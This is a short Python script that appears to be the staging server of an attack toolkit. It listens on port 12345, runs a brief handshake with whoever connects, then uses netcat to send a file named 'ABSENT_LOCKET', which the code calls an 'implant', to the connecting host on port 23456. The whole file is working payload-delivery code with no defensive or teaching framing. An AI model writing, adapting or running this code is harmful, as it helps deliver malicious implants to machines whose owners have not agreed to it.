#!/usr/bin/env python3
import socket, subprocess, time
HOST = ''
PORT = 12345

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        message = conn.recv(1024)
        print(repr(message))
        conn.send(b'SYN/ACK')
        message = conn.recv(1024)
        print(repr(message))
        nc_message = conn.recv(1024)
        print(repr(nc_message))
print(addr[0])
with open('ABSENT_LOCKET', 'rb') as implant:
    sub = subprocess.Popen(['nc', '-w 3', f'{addr[0]}',  '23456'], stdin = implant)
    sub.communicate()
print('IMPLANT SENT')
